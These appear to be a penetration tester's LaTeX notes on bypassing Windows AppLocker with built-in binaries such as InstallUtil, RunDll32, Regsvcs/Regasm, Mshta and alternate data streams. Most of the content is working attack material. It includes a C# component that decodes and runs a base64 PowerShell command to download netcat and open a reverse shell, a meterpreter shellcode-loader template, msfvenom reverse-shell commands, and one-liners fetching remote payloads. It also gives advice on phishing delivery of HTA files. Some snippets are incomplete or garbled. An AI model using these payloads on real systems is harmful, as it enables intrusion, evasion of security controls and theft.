\section{Applocker}

\subsection{LolBAS}

\subsubsection{InstallUtil}

InstallUtil is a Microsoft command-line utility which can be used to install and uninstall server resources. The program is automatically installed alongside Visual Studio.

create a Console App  binary that extend \href{https://learn.microsoft.com/en-us/dotnet/api/system.configuration.install.installer?view=netframework-4.8.1}{System.Configuration.Install.Installer}


 Since this is not a default class, we will need to manually add a reference to the library which contains it. We can do this through the \verb+Project > Add Reference...+ menu and search for \verb+System.Configuration.Install.dll+
 
\begin{verbatim}
using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;


[System.ComponentModel.RunInstaller(true)]
public class Program : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(uint lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr param,
        uint dwCreationFlags, ref uint lpThreadId);

    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle,
        uint dwMilliseconds);

    private static StreamWriter
        sw; // Needs to be global so that HandleDataReceived() can access it

    public override void Uninstall(
        System.Collections.IDictionary savedState)
    {
        RPwSh();
    }
}

public class dummy
{
    public static void Main(string[] args)
    {
    }
}
\end{verbatim}



then to launch the binary:
\begin{verbatim}
InstallUtil.exe /logfile= /LogToConsole=false /U <binary_path>
\end{verbatim}



\subsubsection{RunDll32}

RunDll32 is a standard Microsoft binary which comes with Windows. The utility may be used to load and execute dynamic-link libraries (DLLs). It is typically located at:
\begin{itemize}
    \item 
        32-bit: \verb+C:\Windows\SysWOW64\rundll32.exe+
    \item 
        64-bit: \verb+C:\Windows\System32\rundll32.exe+
\end{itemize}



Dll32 will usually get past AppLocker policies since it is a legitimate Microsoft binary which has actual non-malicious use.

By default, you can not export DLL methods from .NET programs, since it is managed code. 

Nevertheless, there is a GitHub project called \href{https://github.com/3F/DllExport}{DllExport} which allows us to export methods. To use this tool, we will need to add the NuGet package to the project.

The Project needs to be a {\bf Class Library (.NET Framework)}

\begin{itemize}
    \item Add DllExport Nuget:
        \begin{itemize}
            \item Download \href{https://github.com/jubeaz/pentest_code_utils/tree/master/dotNet/Nuget}{dllexport.1.7.4.nupkg}
            \item \verb+Project > Manage NuGet Packages...+
            \item click on the \verb+Settings (gear)+ icon
            \item Add a new package source pointing at fs where \verb+dllexport.1.7.4.nupkg+ was saved+
        \end{itemize}
    \item Select  \verb+Settings (gear)+ icon once again and select only the add nuget
    \item Install \verb+DllExport+
    \item Once the package is installed, a window will pop up. The only thing to do here is mark the highlighted Installed checkbox, and then click Apply.
    \item then Select \verb+Reload All+
\end{itemize}


Whatever method marked with \verb+[DllExport("FunctionName")]+ will be exported when the program is compiled; we can use any arbitrary name. 

\begin{verbatim}
using RunDll32Exploit;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Run32Exploit
{
    internal class Program
    {
        [DllExport("DllMain")]
        public static void DllMain()
        {
        }

    }
}

\end{verbatim}

select \verb+Build > Build RShell_D+ to compile the program

To run the payload:
\begin{verbatim}
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
\end{verbatim}

\subsubsection{Regsvcs.exe / Regasm}
\verb+Regsvcs+ and \href{https://learn.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool}{Regasm} are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies.

The Assembly Registration tool reads the metadata within an assembly and adds the necessary entries to the registry, which allows COM clients to create .NET Framework classes transparently. Once a class is registered, any COM client can use it as though the class were a COM class. The class is registered only once, when the assembly is installed. Instances of classes within the assembly cannot be created from COM until they are actually registered.

The only requirement is that {\bf the assembly files needs to be signed with a strong name}. Microsoft has released a utility with the name \verb+Sn.exe+ (Strong Name Tool) which is part of Visual Studio and .NET framework tools and can be used to generate pairs of public and private keys.

These methods can be executed like this:
\begin{verbatim}
regsvcs.exe evil.dll
regsvcs.exe /u evil.dll
regasm.exe evil.dll
regasm.exe /u evil.dll
\end{verbatim}

\begin{verbatim}
sn -k key.snk
\end{verbatim}



\href{https://github.com/ALBY-Project/ALBY}{ALBY} 

\begin{itemize}
    \item 
        \href{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/md/Regasm.exe.md}{Regasm.exe Exploit}
    \item
        \href{https://medium.com/axon-technologies/threat-hunting-for-the-most-common-mitre-att-ck-techniques-part-4-72e4fc8178bc}{Threat Hunting for the Most Common MITRE ATT\&CK Techniques (Part 4)}
    \item
        \href{https://medium.com/axon-technologies/threat-hunting-for-the-most-common-mitre-att-ck-techniques-part-4-72e4fc8178bc}{Threat Hunting for the Most Common MITRE ATT\&CK Techniques (Part 4)}
    \item
        \href{https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/}{AppLocker – Case study – How insecure is it really? – Part 1}
    \item
        \href{http://diranieh.com/NETAdvanced/ServicedComponents.htm}{.NET Serviced Components}
    \item
        \href{https://learn.microsoft.com/en-us/visualstudio/code-quality/ca1411?view=vs-2019&tabs=csharp}{CA1411: COM registration methods should not be visible}
    \item
        \url{https://learn.microsoft.com/en-us/dotnet/framework/interop/registering-assemblies-with-com}
    \item 
        \url{https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.comregisterfunctionattribute?view=net-8.0}{ComRegisterFunctionAttribute Class}
\end{itemize}


Need to add \verb+System.EnterpriseServices+ reference

see \href{https://learn.microsoft.com/en-us/visualstudio/ide/managing-assembly-and-manifest-signing?view=vs-2022}{Manage assembly and manifest signing} for procedure to sign within visual studio


\verb+emplate_RegsvcsRegasm_PowerShell.cs+:
\begin{verbatim}
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.EnterpriseServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace RegasmBypass
{
    public class RegasmBypass : ServicedComponent
    {
        [ComUnregisterFunction]
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("Follow the white rabbit!");
            /*
echo 'Invoke-WebRequest http://10.10.16.2/nc.exe -OutFile c:\windows\temp\nc.exe; 
c:\windows\temp\nc.exe -nv 10.10.16.2 4444 -e c:\windows\system32\cmd.exe;'| base64 -w 0
            */
            string encCommand =
                "SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE2LjIvbmMuZXhlIC1PdXRGaWxlIGM6XHdpbmRvd3NcdGVtcFxuYy5leGU7IGM6XHdpbmRvd3NcdGVtcFxuYy5leGUgLW52IDEwLjEwLjE2LjIgNDQ0NCAtZSBjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGU7Cg==";
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke rInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            //Decode the base64 encoded command
            byte[] data = Convert.FromBase64String(encCommand);
            string command = Encoding.ASCII.GetString(data);
            Console.WriteLine($"Follow the white rabbit! {command}");
            pipeline.Commands.AddScript(command);
            pipeline.Invoke();
            runspace.Close();

            var home =
                Environment.GetFolderPath(Environment.SpecialFolder
                    .UserProfile);
            Console.WriteLine($"Follow the white rabbit! {home}");
            return;
        }
    }
}
\end{verbatim}

trying to launch a powershell revshell will be blocked by amsi.

To compile:
\begin{verbatim}
csc.exe -r:System.EnterpriseServices.dll \
    -r:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.automation.dll \
    -target:library -out:regasm.dll -keyfile:key.snk .\RegasmBypass\Class1.cs

\end{verbatim}


\verb+Template_RegsvcsRegasm_Shellcode.cs+:
\begin{verbatim}
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
[assembly: AssemblyKeyFileAttribute("meta.snk")]

namespace Bypass_Regsvc_regasm_AppLocker
{
    public class Bypass : ServicedComponent
    {
        static void Main()
        {

        }

        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("Follow the white rabbit!");
            
            // Shellcode
            // generated with:
            // msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.10.10" LPORT="443" -e x86/shikata_ga_nai -i 15 -f csharp

            !INSERTCODEHERE!
			

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }



        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}
\end{verbatim}


\subsection{Abusing writable paths}

 By default, \verb+C:\Windows+ is not blocked, and \verb+C:\Windows\Tasks+ is
 writtable by any users
\begin{itemize}
    \item 
        \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md}
    \item
        \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md}
    \item
        \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md}
\end{itemize}

 \subsection{Alternative Data Streams App Locker}
 \href{https://0xsp.com/offensive/handy-techniques-to-bypass-environment-restrictions/}{handy techniques to bypass environment restrictions}
after installation of the app locker on a windows machine the first login user will be able to access these files’ locations as below with full access

\begin{verbatim}
AppCache.dat
AppCache.dat.LOG1
AppCache.dat.LOG2
\end{verbatim}

abusing these files could be done using alternative data stream execution since the app locker locks these files. so you may need to execute the following instructions

Adding binary into the stream
\begin{verbatim}
type evilfile.exe > C:\Windows\System32\AppLocker\AppCache.dat.LOG1:evil.exe
Code language: CSS (css)
\end{verbatim}

Calling wait to call the process:
\begin{verbatim}
wmic process call create 'C:\Windows\System32\AppLocker\AppCache.dat.LOG1:evil.exe
\end{verbatim}

you may also consider the following list of commands with the same scope of attack methodology:
\begin{verbatim}
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll > fakefile.doc:reg32.bat
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns
\end{verbatim}

\subsection{Presentationhost.exe}

\begin{verbatim}
private void Button_click(object sender, RoutedEventArgs e)
{
    if (RadioButton1.IsChecked == true)
    {
        Process.Start("C:\\poc\\evil.exe");
        MessageBox.Show("BHello.");
    }
}
\end{verbatim}

\begin{verbatim}
Presentationhost.exe file:///tmp/poc.xbap
\end{verbatim}


\subsection{Mshta.exe}

\verb+Mshta.exe+ is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension \verb+.hta+. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications).

\begin{verbatim}
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>


<public>
    <method name="Exec"></method>
</public>


<script language="JScript">
<![CDATA[
    function Exec() {
        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    }
]]>
</script>
</scriptlet>
\end{verbatim}

then save it as payload.sct for an example, after that you can simply call it through mshta process
\begin{verbatim}
mshta.exe javascript:a=(GetObject("script:http://192.168.68.104/payload.sct")).Exec();close();
\end{verbatim}

\begin{verbatim}
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
\end{verbatim}

Save the file and browse to this file in explorer and double-click it to run.If calculater pops up it means code get executed.We can now replace the calc to payload to get shell.

\begin{verbatim}
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta
\end{verbatim}

NOTE: During phishing we will host our hta file and use link in a phishing mail http://x.x.x.x/demo.hta . If you send hta file directly as an attachment, by default, Office has filetype filtering in place that will prevent you from attaching certain files to emails (including HTAs, which is why we'd opt to sending a link instead).

\href{https://github.com/bvoris/HTAArbitraryCodeFramework}{HTA Arbitrary Code Execution Framework}

